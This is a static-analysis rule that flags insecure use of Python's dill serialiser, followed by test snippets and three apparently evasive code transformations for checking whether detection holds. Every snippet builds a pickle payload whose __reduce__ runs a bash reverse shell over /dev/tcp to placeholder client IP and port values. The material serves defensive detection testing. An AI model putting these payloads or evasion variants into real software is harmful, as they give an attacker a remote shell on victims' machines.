### Rule
``` yaml
rules:
  - id: avoid-dill
    metadata:
      owasp:
        - A08:2017 - Insecure Deserialization
        - A08:2021 - Software and Data Integrity Failures
      cwe:
        - "CWE-502: Deserialization of Untrusted Data"
      references:
        - https://docs.python.org/3/library/pickle.html
      category: security
      technology:
        - python
      cwe2022-top25: true
      cwe2021-top25: true
      subcategory:
        - audit
      likelihood: LOW
      impact: MEDIUM
      confidence: LOW
      license: Commons Clause License Condition v1.0[LGPL-2.1-only]
      vulnerability_class:
        - "Insecure Deserialization "
    languages:
      - python
    message: Avoid using `dill`, which uses `pickle`, which is known to lead to code
      execution vulnerabilities. When unpickling, the serialized data could be
      manipulated to run arbitrary code. Instead, consider serializing the
      relevant data as JSON or a similar text-based serialization format.
    severity: WARNING
    patterns:
      - pattern: dill.$FUNC(...)
      - pattern-not: dill.$FUNC("...")
````
### Code Snippet
```python
class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )


import dill

# ruleid: avoid-dill
shell = dill.dumps(Shell_code())
```
### Transformation 1*
```python
class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )


import dill

# ruleid: avoid-dill
myfunc = dill.dumps
shell = myfunc(Shell_code())
```
### Transformation 2
```python
import os
import sys

sys.modules['dill'] = __import__('dill')

class Shell_code(object):
    def __reduce__(self):
        return (os.system, ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))

shell = sys.modules['dill'].dumps(Shell_code())
```
### Transformation 3
```python
import os
import dill

class Shell_code(object):
    def __reduce__(self):
        return (os.system, ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))

def get_dill(d=dill.dumps):
    return d(Shell_code())

shell = get_dill()
```

